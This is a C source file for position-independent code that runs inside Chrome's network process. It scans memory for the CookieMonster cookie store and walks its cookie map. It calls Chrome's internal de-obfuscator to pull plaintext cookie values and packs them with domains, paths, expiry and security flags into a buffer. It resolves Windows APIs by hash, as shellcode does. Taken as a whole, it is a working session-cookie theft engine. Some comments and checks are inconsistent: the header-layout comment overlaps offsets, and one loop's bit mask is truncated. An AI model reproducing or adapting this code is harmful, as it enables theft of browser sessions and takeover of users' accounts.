#define PIC_CODE_SECTION_NAME ".text$F"
#include "margaret.h"
#include "chromium_adapter.h"
#include "pic_resolve.h"

/*
 * Engine A "netsvc-store": vtable-anchored CookieMonster discovery + map
 * walk + cookie serialization.  Runs in the network utility process.
 *
 * Layout constants are validated per-build (docs/cc-layout-153.0.8010.53.md);
 * the adapter gate already verified the build before this code runs.
 * Every walk is bounded and every pointer dereference is validated.
 */

/* FNV-1a of L"kernel32.dll" (UTF-16, a-z fold) */


/* FNV-1a of "VirtualQuery" (ASCII, a-z fold) */


/* FNV-1a of "GetTickCount" (ASCII, a-z fold) */


/* MEMORY_BASIC_INFORMATION (Windows x64) — fields read byte-wise below so
 * GCC never merges adjacent dwords into an 8-byte load + movabs mask. */
typedef struct PIC_ENGINE_A_MBI {
    pic_uptr BaseAddress;       /* +0x00 */
    pic_uptr AllocationBase;    /* +0x08 */
    pic_u32 AllocationProtect;  /* +0x10 */
    pic_u16 PartitionId;        /* +0x14 */
    pic_u16 _padding;           /* +0x16 */
    pic_uptr RegionSize;        /* +0x18 */
    pic_u32 State;              /* +0x20 */
    pic_u32 Protect;            /* +0x24 */
    pic_u32 Type;               /* +0x28 */
} PIC_ENGINE_A_MBI;

#define MBI_OFF_STATE   0x20u
#define MBI_OFF_PROTECT 0x24u
#define MBI_OFF_BASE    0x00u
#define MBI_OFF_REGION  0x18u

#define MEM_COMMIT 0x1000u
#define PAGE_GUARD 0x100u

typedef pic_uptr (PIC_MS_ABI *PIC_VIRTUAL_QUERY_FN)(
    const void *address, PIC_ENGINE_A_MBI *info, pic_size length);

typedef pic_u32 (PIC_MS_ABI *PIC_GET_TICK_COUNT_FN)(void);

/* --- byte readers (same pattern as resolve.c/adapter.c) --- */

static PIC_CODE pic_u32 engine_a_read_u32(const pic_u8 *data)
{
    return (pic_u32)((pic_u32)data[0] |
                     ((pic_u32)data[1] << 8u) |
                     ((pic_u32)data[2] << 16u) |
                     ((pic_u32)data[3] << 24u));
}

static PIC_CODE pic_u64 engine_a_read_u64(const pic_u8 *data)
{
    return (pic_u64)engine_a_read_u32(data) |
           ((pic_u64)engine_a_read_u32(data + 4) << 32u);
}

/* --- libc++ SSO string reader --- */

typedef struct PIC_CC_STRING_VIEW {
    const pic_u8 *data;
    pic_u32 length;
} PIC_CC_STRING_VIEW;

/*
 * Read a Chromium libc++ string (24 bytes on x64).  Short strings (<= 22
 * bytes) have inline data and the length in byte 23 (bit 7 clear).
 * Long strings have a heap pointer at +0 and length at +8.
 * Returns PIC_FALSE when the string is malformed.
 */
static PIC_CODE pic_bool engine_a_read_cc_string(const pic_u8 *string,
                                                  PIC_CC_STRING_VIEW *view)
{
    pic_u8 size_byte;
    pic_u64 pointer;

    if (string == PIC_NULL || view == PIC_NULL) {
        return PIC_FALSE;
    }

    size_byte = string[23];
    if ((size_byte & 0x80u) == 0u) {
        /* short: data is inline, length in byte 23 */
        view->data = string;
        view->length = (pic_u32)(size_byte & 0x7Fu);
        return PIC_TRUE;
    }

    /* long: pointer at +0, length at +8 */
    pointer = engine_a_read_u64(string);
    view->length = (pic_u32)engine_a_read_u64(string + 8);
    if (pointer == 0 || view->length == 0u || view->length > 4096u) {
        view->data = PIC_NULL;
        view->length = 0u;
        return PIC_FALSE;
    }
    view->data = (const pic_u8 *)pointer;
    return PIC_TRUE;
}

/* --- bounded memory copy with capacity check --- */

static PIC_CODE pic_bool engine_a_write_bytes(pic_u8 **cursor,
                                               pic_u32 *remaining,
                                               const pic_u8 *source,
                                               pic_u32 length)
{
    if (*remaining < length) {
        return PIC_FALSE;
    }
    for (pic_u32 i = 0u; i < length; ++i) {
        (*cursor)[i] = source[i];
    }
    *cursor += length;
    *remaining -= length;
    return PIC_TRUE;
}

static PIC_CODE pic_bool engine_a_write_u32(pic_u8 **cursor,
                                             pic_u32 *remaining,
                                             pic_u32 value)
{
    if (*remaining < 4u) {
        return PIC_FALSE;
    }
    (*cursor)[0] = (pic_u8)(value & 0xFFu);
    (*cursor)[1] = (pic_u8)((value >> 8u) & 0xFFu);
    (*cursor)[2] = (pic_u8)((value >> 16u) & 0xFFu);
    (*cursor)[3] = (pic_u8)((value >> 24u) & 0xFFu);
    *cursor += 4u;
    *remaining -= 4u;
    return PIC_TRUE;
}

/* --- CookieMonster tree walk --- */

#define MARGARET_MAX_COOKIES_PER_INSTANCE 4096u
#define MARGARET_MAX_TREE_DEPTH 64u
/* Scan-hit budget.  False positives (the vtable VA copied onto
 * thread stacks or into low heaps during init) are cheap: the
 * region vetting rejects them without a dereference, so let the
 * scan run past them until the real CookieMonster's heap is
 * reached.  The outer bounds remain the scan byte budget and
 * the caller timeout. */
#define MARGARET_MAX_INSTANCES 4096u

/*
 * True when p looks like a live heap pointer in user space: above the
 * null page, below the user-space cap, and 8-byte aligned (libc++ tree
 * nodes and partition-alloc chunks are).  False positives are fine: the
 * vtable check on the cookie is the authoritative gate.
 */
static PIC_CODE pic_bool engine_a_ptr_plausible(pic_uptr p)
{
    pic_u32 hi;
    /* user space on Win10+ is below 128 TB: any pointer whose high 16
     * bits are set is not a live heap address (also covers negatives).
     * Split into 32-bit ops so no 64-bit immediate is materialized. */
    if (p < 0x10000u || (p & 7u) != 0u) {
        return PIC_FALSE;
    }
    hi = (pic_u32)(p >> 32u);
    return (hi >> 16u) == 0u;
}

/* The cookie's first qword is its vtable pointer, which lives inside
 * chrome.dll.  Any non-cookie garbage fails this and is skipped. */
static PIC_CODE pic_bool engine_a_cookie_valid(const pic_u8 *cookie,
                                                pic_uptr chrome_base,
                                                pic_uptr chrome_size)
{
    pic_uptr vtable;
    if (!engine_a_ptr_plausible((pic_uptr)cookie)) {
        return PIC_FALSE;
    }
    vtable = (pic_uptr)engine_a_read_u64(cookie);
    return vtable >= chrome_base && vtable < chrome_base + chrome_size;
}

/* True when p sits in a committed, readable, non-guarded region.  Used
 * to vet untrusted pointers read out of a candidate instance before any
 * dereference: VirtualQuery costs nothing next to an AV. */
static PIC_CODE pic_bool engine_a_region_ok(const void *p,
                                             PIC_ENGINE_A_MBI *mbi,
                                             PIC_VIRTUAL_QUERY_FN vq)
{
    pic_u32 state;
    pic_u32 prot;
    if (vq(p, mbi, sizeof(*mbi)) == 0u) {
        return PIC_FALSE;
    }
    state = engine_a_read_u32((const pic_u8 *)mbi + MBI_OFF_STATE);
    prot = engine_a_read_u32((const pic_u8 *)mbi + MBI_OFF_PROTECT);
    return state == MEM_COMMIT && (prot & 0xEEu) != 0u &&
           (prot & PAGE_GUARD) == 0u;
}

/*
 * In-order successor for a libc++ __tree_node.
 * node layout: left at +0x00, right at +0x08, parent at +0x10.
 */
static PIC_CODE pic_uptr engine_a_tree_next(const pic_u8 *node,
                                             pic_uptr end_sentinel)
{
    pic_uptr right;
    pic_uptr current;
    pic_uptr parent;
    pic_u32 depth;

    right = (pic_uptr)engine_a_read_u64(node + 0x08);
    if (right != 0u) {
        /* leftmost of right subtree */
        if (!engine_a_ptr_plausible(right)) {
            return 0u; /* malformed tree: stop this instance */
        }
        current = right;
        for (depth = 0u; depth < MARGARET_MAX_TREE_DEPTH; ++depth) {
            pic_uptr left = (pic_uptr)engine_a_read_u64((const pic_u8 *)current);
            if (left == 0u) {
                return current;
            }
            if (!engine_a_ptr_plausible(left)) {
                return 0u; /* malformed tree: stop this instance */
            }
            current = left;
        }
        return 0u; /* bound exceeded: malformed tree */
    }

    /* go up until we came from the right */
    current = (pic_uptr)node;
    for (depth = 0u; depth < MARGARET_MAX_TREE_DEPTH; ++depth) {
        parent = (pic_uptr)engine_a_read_u64((const pic_u8 *)current + 0x10);
        if (parent == 0u || parent == end_sentinel) {
            return 0u;
        }
        if (!engine_a_ptr_plausible(parent)) {
            return 0u; /* malformed tree: stop this instance */
        }
        {
            pic_uptr parent_left =
                (pic_uptr)engine_a_read_u64((const pic_u8 *)parent);
            /* the successor is the first ancestor reached from its
             * LEFT subtree: current = parent's left child */
            if (parent_left == current) {
                return parent;
            }
        }
        current = parent;
    }
    return 0u; /* bound exceeded */
}

/* --- cookie serialization --- */

/*
 * Serialize one CanonicalCookie into the output buffer.
 * Format: [name_len][name][domain_len][domain][path_len][path]
 *         [value_len][value]
 *         [creation(8)][expiry(8)][flags(4)][same_site(4)][port(4)]
 * The value is the PLAINTEXT from CanonicalCookie::Value() (the
 * de-obfuscating accessor; a direct call, no callback involved).
 * Atomic: the full size is computed first; if it does not fit, nothing is
 * written (the caller can rely on cookie_count == number of whole cookies).
 */
#define MARGARET_CC_FIXED_BYTES 32u /* value_len+creation+expiry+flags+samesite+port */

typedef void (PIC_MS_ABI *PIC_COOKIE_VALUE_FN)(void *out, void *cookie);

/* --- flags auto-calibration ------------------------------------------
 *
 * The CanonicalCookie struct contains adjacent bool members secure_ and
 * httponly_.  Their absolute offset shifts across patch-level rebuilds,
 * so instead of hardcoding it we discover it at runtime using the
 * RFC 6265bis __Secure- prefix as ground truth: a cookie with that
 * prefix MUST have secure_=true (Chrome enforces it at the jar level).
 *
 * A 32-bit mask tracks candidate byte offsets in [+0x100..+0x11F]:
 *   bit N = offset 0x100+N.  __Secure- cookies eliminate candidates
 *   where the byte is 0; non-Secure cookies eliminate candidates where
 *   the byte is non-zero.  When one candidate remains, that is the
 *   secure_ offset; httponly_ is the adjacent byte.  Fail-closed: if
 *   calibration is ambiguous, flags output as 0. */
#define FLAGS_SCAN_BASE   0x100u
#define FLAGS_SCAN_WIDTH  0x20u   /* 32 candidate offsets */
#define FLAGS_ALL_CAND    0xFFFFFFFFu /* all 32 bits = all candidates */

typedef struct PIC_FLAGS_CAL {
    pic_u32 candidates;  /* bitmask of surviving candidate offsets */
    pic_u8  calibrated;  /* 0 = in progress, 1 = done, 2 = failed */
    pic_u8  secure_off;  /* calibrated offset (relative to cookie) */
} PIC_FLAGS_CAL;

static PIC_CODE void engine_a_flags_cal_update(
    PIC_FLAGS_CAL *cal, const pic_u8 *cookie, const pic_u8 *name,
    pic_u32 name_len)
{
    pic_u32 i;

    if (cal == PIC_NULL || cookie == PIC_NULL || cal->calibrated != 0u) {
        return;
    }

    /* is this a __Secure- prefixed cookie? (8 bytes minimum) */
    {
        pic_u8 is_secure = 0u;
        if (name_len >= 8u && name[0u] == (pic_u8)'_' &&
            name[1u] == (pic_u8)'_' && name[2u] == (pic_u8)'S' &&
            name[3u] == (pic_u8)'e' && name[4u] == (pic_u8)'c' &&
            name[5u] == (pic_u8)'u' && name[6u] == (pic_u8)'r' &&
            name[7u] == (pic_u8)'e' && name[8u] == (pic_u8)'-') {
            is_secure = 1u;
        }

        for (i = 0u; i < FLAGS_SCAN_WIDTH; i++) {
            pic_u8 bit = 1u << i;
            if ((cal->candidates & bit) == 0u) {
                continue;
            }
            {
                pic_u8 b = cookie[FLAGS_SCAN_BASE + i];
                if (is_secure && b == 0u) {
                    cal->candidates &= (pic_u32)~bit;
                } else if (!is_secure && b != 0u) {
                    /* only eliminate if we're sure this cookie is NOT
                     * secure: __Host- is also secure, and we can't
                     * know for arbitrary names — so only eliminate on
                     * cookies we're CONFIDENT are non-secure (short
                     * tracking/analytics names without any prefix) */
                    if (name_len < 8u ||
                        (name[0u] != (pic_u8)'_' && name[0u] != (pic_u8)'_')) {
                        cal->candidates &= (pic_u32)~bit;
                    }
                }
            }
        }

        /* exactly one candidate left? calibrated */
        if (cal->candidates != 0u &&
            (cal->candidates & (cal->candidates - 1u)) == 0u) {
            /* single bit set */
            for (i = 0u; i < FLAGS_SCAN_WIDTH; i++) {
                if (cal->candidates & (1u << i)) {
                    cal->secure_off = (pic_u8)(FLAGS_SCAN_BASE + i);
                    cal->calibrated = 1u;
                    return;
                }
            }
        }
        if (cal->candidates == 0u) {
            cal->calibrated = 2u; /* failed: contradictory evidence */
        }
    }
}

static PIC_CODE pic_u32 engine_a_flags_read(
    const PIC_FLAGS_CAL *cal, const pic_u8 *cookie)
{
    if (cal == PIC_NULL || cookie == PIC_NULL || cal->calibrated != 1u) {
        return 0u; /* fail-closed */
    }
    /* pack: bit 0 = secure_ (bool), bit 1 = httponly_ (adjacent bool) */
    {
        pic_u8 secure = cookie[cal->secure_off];
        pic_u8 httponly = cookie[cal->secure_off + 1u];
        return (pic_u32)(secure & 1u) | ((pic_u32)(httponly & 1u) << 1u);
    }
}

static PIC_CODE pic_bool engine_a_serialize_cookie(
    const pic_u8 *cookie,
    pic_u8 **cursor,
    pic_u32 *remaining,
    const pic_u8 *chrome_base,
    pic_uptr value_fn,
    pic_uptr deobf_fn,
    PIC_FLAGS_CAL *flags_cal)
{
    PIC_CC_STRING_VIEW name;
    PIC_CC_STRING_VIEW domain;
    PIC_CC_STRING_VIEW path;
    PIC_CC_STRING_VIEW value;
    pic_u32 total;

    if (cookie == PIC_NULL) {
        return PIC_FALSE;
    }

    /* name at +0x08, domain at +0x20, path at +0x38 */
    if (!engine_a_read_cc_string(cookie + 0x08, &name) ||
        !engine_a_read_cc_string(cookie + 0x20, &domain) ||
        !engine_a_read_cc_string(cookie + 0x38, &path)) {
        return PIC_FALSE;
    }

    /* value: the x64dbg-proven chain. The cookie's obfuscation flag
     * @ +0x108 gates a direct call: fn(rcx = &cookie[0xE0] (the
     * obfuscated_value_ string, by pointer), rdx = &out_string) ->
     * out receives the plaintext libc++ string.  Mirrors the inlined
     * Value() site at 0xA9CFE2. */
    (void)value_fn; /* superseded by the x64dbg-proven single-call chain */
    value.data = PIC_NULL;
    value.length = 0u;
    if (deobf_fn != 0u && chrome_base != PIC_NULL &&
        cookie[0x108u] == 1u) {
        pic_u8 out[24];
        (void)margaret_memzero(out, sizeof(out));
        ((PIC_COOKIE_VALUE_FN)deobf_fn)((void *)(cookie + 0xE0u), out);
        (void)engine_a_read_cc_string(out, &value);
    }

    /* atomic size check: no partial cookie may remain in the buffer */
    total = 16u + name.length + domain.length + path.length + value.length +
            MARGARET_CC_FIXED_BYTES;
    if (*remaining < total) {
        return PIC_FALSE;
    }

    /* write: lengths then data */
    if (!engine_a_write_u32(cursor, remaining, name.length) ||
        !engine_a_write_bytes(cursor, remaining, name.data, name.length) ||
        !engine_a_write_u32(cursor, remaining, domain.length) ||
        !engine_a_write_bytes(cursor, remaining, domain.data, domain.length) ||
        !engine_a_write_u32(cursor, remaining, path.length) ||
        !engine_a_write_bytes(cursor, remaining, path.data, path.length) ||
        !engine_a_write_u32(cursor, remaining, value.length) ||
        !engine_a_write_bytes(cursor, remaining, value.data, value.length)) {
        return PIC_FALSE;
    }

    /* creation_date at +0x50 (8 bytes) */
    {
        pic_u8 time_buf[8];
        pic_u64 t = engine_a_read_u64(cookie + 0x50);
        for (pic_u32 i = 0u; i < 8u; ++i) {
            time_buf[i] = (pic_u8)((t >> (i * 8u)) & 0xFFu);
        }
        if (!engine_a_write_bytes(cursor, remaining, time_buf, 8u)) {
            return PIC_FALSE;
        }
    }

    /* expiry_date at +0x78 (8 bytes) */
    {
        pic_u8 time_buf[8];
        pic_u64 t = engine_a_read_u64(cookie + 0x78);
        for (pic_u32 i = 0u; i < 8u; ++i) {
            time_buf[i] = (pic_u8)((t >> (i * 8u)) & 0xFFu);
        }
        if (!engine_a_write_bytes(cursor, remaining, time_buf, 8u)) {
            return PIC_FALSE;
        }
    }

    /* flags: auto-calibrated secure_/httponly_ bools (see above);
     * the update happens AFTER the name is read, so the first few
     * cookies may output 0 until calibration converges */
    engine_a_flags_cal_update(flags_cal, cookie,
                              name.data, name.length);
    if (!engine_a_write_u32(cursor, remaining,
                            engine_a_flags_read(flags_cal, cookie))) {
        return PIC_FALSE;
    }

    /* same_site at +0xD8, source_port at +0xDC (each a u32) */
    if (!engine_a_write_u32(cursor, remaining,
                             engine_a_read_u32(cookie + 0xD8)) ||
        !engine_a_write_u32(cursor, remaining,
                             engine_a_read_u32(cookie + 0xDC))) {
        return PIC_FALSE;
    }

    return PIC_TRUE;
}

/* --- discovery + walk + serialize (main Engine A entry) --- */

/*
 * Output format:
 *   [0..3]   magic "MCEA" (Margaret Cookie Engine A)
 *   [12..19] scan-end address; [20..27] last-hit address (diagnostics)
 *   [4..7]   cookie_count
 *   [8..11]  instance_count
 *   [12..15] reserved
 *   [16..]   serialized cookies (one after another)
 */
#define MARGARET_ENGINE_A_MAGIC 0x4145434Du /* "MCEA" LE */

PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
    PIC_CONTEXT *ctx,
    const MARGARET_CHROMIUM_ADAPTER *adapter,
    MARGARET_ARGS *args)
{
    void *kernel32_base;
    PIC_VIRTUAL_QUERY_FN virtual_query;
    PIC_GET_TICK_COUNT_FN get_tick_count;
    pic_u8 *cursor;
    pic_u32 remaining;
    pic_u32 cookie_count;
    pic_u32 instance_count;
    pic_u32 status;
    pic_uptr scan_end_addr;
    pic_uptr last_hit_addr;

    if (ctx == PIC_NULL || adapter == PIC_NULL || args == PIC_NULL) {
        return (pic_u32)MARGARET_STATUS_BAD_ARGUMENT;
    }
    if (args->output_buffer == PIC_NULL || args->output_capacity < 32u) {
        args->output_length = 32u;
        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
    }

    /* resolve VirtualQuery from kernel32.dll */
    {
        PIC_HASH k32 = MARGARET_MODULE_HASH_KERNEL32_DLL;
        PIC_HASH vq = MARGARET_HASH_VIRTUALQUERY;
        PIC_HASH gtc = MARGARET_HASH_GETTICKCOUNT;
        if (pic_find_module(ctx, &k32, &kernel32_base) !=
            PIC_RESOLVE_OK) {
            ctx->last_error = (pic_u32)PIC_RESOLVE_MODULE_NOT_FOUND;
            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
        }
        if (pic_resolve_export(ctx, kernel32_base, &vq,
                               (void **)&virtual_query) != PIC_RESOLVE_OK) {
            ctx->last_error = (pic_u32)PIC_RESOLVE_EXPORT_NOT_FOUND;
            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
        }
        if (pic_resolve_export(ctx, kernel32_base, &gtc,
                               (void **)&get_tick_count) != PIC_RESOLVE_OK) {
            ctx->last_error = (pic_u32)PIC_RESOLVE_EXPORT_NOT_FOUND;
            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
        }
    }

    scan_end_addr = 0u;
    last_hit_addr = 0u;
    cursor = (pic_u8 *)args->output_buffer;
    remaining = args->output_capacity;

    /* write header (fixed 32 bytes): magic + counts + scan diagnostics */
    if (!engine_a_write_u32(&cursor, &remaining, MARGARET_ENGINE_A_MAGIC)) {
        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
    }
    /* placeholders: cookie_count, instance_count, scan_end (2 u32),
     * last_hit (2 u32), reserved -- patched at the end */
    if (!engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u) ||
        !engine_a_write_u32(&cursor, &remaining, 0u)) {
        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
    }

    cookie_count = 0u;
    instance_count = 0u;
    PIC_FLAGS_CAL flags_cal;
    flags_cal.candidates = FLAGS_ALL_CAND;
    flags_cal.calibrated = 0u;
    flags_cal.secure_off = 0u;
    status = (pic_u32)MARGARET_STATUS_OK;

    /* discover chrome.dll base */
    {
        void *chrome_base;
        pic_u32 chrome_size;
        if (!margaret_locate_chrome_dll(ctx, &chrome_base, &chrome_size)) {
            args->status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
            return (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
        }
        args->flags = 20u; /* engine: module re-located */

        /* vtable address (relocated at runtime) */
        {
            const pic_u8 *vtable_ptr =
                (const pic_u8 *)chrome_base + adapter->rva_cookie_monster_vtable;
            pic_u64 vtable_va = (pic_u64)(pic_uptr)vtable_ptr;

            /* bounded committed-memory scan for CookieMonster instances */
            PIC_ENGINE_A_MBI mbi;
            /* Full-range scan from the null page up.  The vtable VA also
             * appears as transient copies on thread stacks (high
             * addresses, past the image) and in low heaps; those hits
             * are cheap because the walk vetting rejects them without a
             * dereference, and the scan stops at the first cookie. */
            pic_uptr address = 0x10000u;
            /* No byte budget: the caller's timeout is the bound.  The
             * low-level scan is cheap in-process and the CM heap sits
             * at a high entropy address, far past where a fixed budget
             * expires. */
            pic_bool stop = PIC_FALSE;
            pic_u32 start_ticks = get_tick_count();
            pic_u32 timeout_ms = args->timeout_ms;

            while (!stop &&
                   instance_count < MARGARET_MAX_INSTANCES &&
                   cookie_count < MARGARET_MAX_COOKIES_PER_INSTANCE &&
                   (timeout_ms == 0u ||
                    (pic_u32)(get_tick_count() - start_ticks) <= timeout_ms)) {
                pic_uptr region_size;

                if (virtual_query((const void *)address, &mbi,
                                   sizeof(mbi)) == 0u) {
                    break;
                }
                region_size = mbi.RegionSize;
                if (region_size == 0u) {
                    break;
                }

                {
                    pic_u32 mbi_state = engine_a_read_u32(
                        (const pic_u8 *)&mbi + MBI_OFF_STATE);
                    pic_u32 mbi_protect = engine_a_read_u32(
                        (const pic_u8 *)&mbi + MBI_OFF_PROTECT);
                    if (mbi_state == MEM_COMMIT &&
                        (mbi_protect & 0xEEu) != 0u && /* readable+exec */
                        (mbi_protect & PAGE_GUARD) == 0u) {
                        /* scan this region for qwords == vtable_va */
                        const pic_u8 *region = (const pic_u8 *)mbi.BaseAddress;
                        pic_u32 region_u32 = (pic_u32)region_size;

                    /* bound the region scan */
                    if (region_u32 > 256u * 1024u * 1024u) {
                        region_u32 = 256u * 1024u * 1024u;
                    }

                    /* 8-byte aligned scan */
                    for (pic_u32 offset = 0u;
                         !stop &&
                         offset + 8u <= region_u32 &&
                         instance_count < MARGARET_MAX_INSTANCES;
                         offset += 8u) {
                        if (engine_a_read_u64(region + offset) == vtable_va) {
                            pic_uptr instance_addr =
                                (pic_uptr)(region + offset);

                            /* skip hits inside chrome.dll (rdata pointers) */
                            if (instance_addr >= (pic_uptr)chrome_base &&
                                instance_addr < (pic_uptr)chrome_base + chrome_size) {
                                continue;
                            }

                            /* candidate instance (validated by the walk) */
                            instance_count++;
                            last_hit_addr = instance_addr;

                            /* walk its cookie map */
                            {
                                const pic_u8 *cm = (const pic_u8 *)instance_addr;
                                PIC_ENGINE_A_MBI vet_mbi;
                                pic_uptr node = engine_a_read_u64(cm + 0x30);
                                pic_uptr end_addr =
                                    (pic_uptr)(cm + 0x38);
                                pic_u32 node_count = 0u;

                                /* vet the untrusted begin node's region
                                 * before trusting any byte of it */
                                if (node != 0u && node != end_addr &&
                                    !engine_a_region_ok(
                                        (const void *)node, &vet_mbi,
                                        virtual_query)) {
                                    node = 0u;
                                }

                                while (!stop &&
                                       node != 0u &&
                                       node != end_addr &&
                                       node_count < MARGARET_MAX_COOKIES_PER_INSTANCE) {
                                    const pic_u8 *cookie;
                                    pic_uptr next_node;

                                    /* the node itself must be a plausible
                                     * heap pointer before we trust it */
                                    if (!engine_a_ptr_plausible(node)) {
                                        break;
                                    }
                                    cookie = (const pic_u8 *)engine_a_read_u64(
                                        (const pic_u8 *)node + 0x38);

                                    /* pre-compute the successor so a bad
                                     * cookie cannot abort the walk */
                                    next_node = engine_a_tree_next(
                                        (const pic_u8 *)node, end_addr);

                                    /* a cookie that fails the region or
                                     * vtable check is SKIPPED, not fatal:
                                     * the rest of the map is still there */
                                    if (engine_a_region_ok(
                                            (const void *)cookie, &vet_mbi,
                                            virtual_query) &&
                                        engine_a_cookie_valid(
                                            cookie, (pic_uptr)chrome_base,
                                            (pic_uptr)chrome_size)) {
                                        pic_uptr value_fn = 0u;
                                        pic_uptr deobf_fn = 0u;
                                        if (adapter->rva_canonical_cookie_deobfuscator != 0u) {
                                            deobf_fn = (pic_uptr)chrome_base +
                                                adapter->rva_canonical_cookie_deobfuscator;
                                        }
                                        if (engine_a_serialize_cookie(
                                                cookie, &cursor, &remaining,
                                                (const pic_u8 *)chrome_base,
                                                value_fn, deobf_fn,
                                                &flags_cal)) {
                                            cookie_count++;
                                        } else {
                                            /* buffer full: stop everything */
                                            status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
                                            stop = PIC_TRUE;
                                        }
                                    }
                                    node_count++;
                                    node = next_node;
                                }
                            }
                        }
                    }
                }
                }

                address = (pic_uptr)mbi.BaseAddress + region_size;
                if (address < (pic_uptr)mbi.BaseAddress) {
                    break; /* overflow */
                }
            }
            scan_end_addr = address;
        }
    }

    args->flags = 30u; /* engine: memory scan + walk complete */
    /* patch header: cookie_count and instance_count */
    {
        pic_u8 *header = (pic_u8 *)args->output_buffer;
        header[4] = (pic_u8)(cookie_count & 0xFFu);
        header[5] = (pic_u8)((cookie_count >> 8u) & 0xFFu);
        header[6] = (pic_u8)((cookie_count >> 16u) & 0xFFu);
        header[7] = (pic_u8)((cookie_count >> 24u) & 0xFFu);
        header[8] = (pic_u8)(instance_count & 0xFFu);
        header[9] = (pic_u8)((instance_count >> 8u) & 0xFFu);
        header[10] = (pic_u8)((instance_count >> 16u) & 0xFFu);
        header[11] = (pic_u8)((instance_count >> 24u) & 0xFFu);
        /* scan diagnostics: where the scan stopped, and the last hit */
        header[12] = (pic_u8)(scan_end_addr & 0xFFu);
        header[13] = (pic_u8)((scan_end_addr >> 8u) & 0xFFu);
        header[14] = (pic_u8)((scan_end_addr >> 16u) & 0xFFu);
        header[15] = (pic_u8)((scan_end_addr >> 24u) & 0xFFu);
        header[16] = (pic_u8)((scan_end_addr >> 32u) & 0xFFu);
        header[17] = (pic_u8)((scan_end_addr >> 40u) & 0xFFu);
        header[18] = (pic_u8)((scan_end_addr >> 48u) & 0xFFu);
        header[19] = (pic_u8)((scan_end_addr >> 56u) & 0xFFu);
        header[20] = (pic_u8)(last_hit_addr & 0xFFu);
        header[21] = (pic_u8)((last_hit_addr >> 8u) & 0xFFu);
        header[22] = (pic_u8)((last_hit_addr >> 16u) & 0xFFu);
        header[23] = (pic_u8)((last_hit_addr >> 24u) & 0xFFu);
        header[24] = (pic_u8)((last_hit_addr >> 32u) & 0xFFu);
        header[25] = (pic_u8)((last_hit_addr >> 40u) & 0xFFu);
        header[26] = (pic_u8)((last_hit_addr >> 48u) & 0xFFu);
        header[27] = (pic_u8)((last_hit_addr >> 56u) & 0xFFu);
    }

    args->output_length = args->output_capacity - remaining;
    args->status = status;
    return status;
}
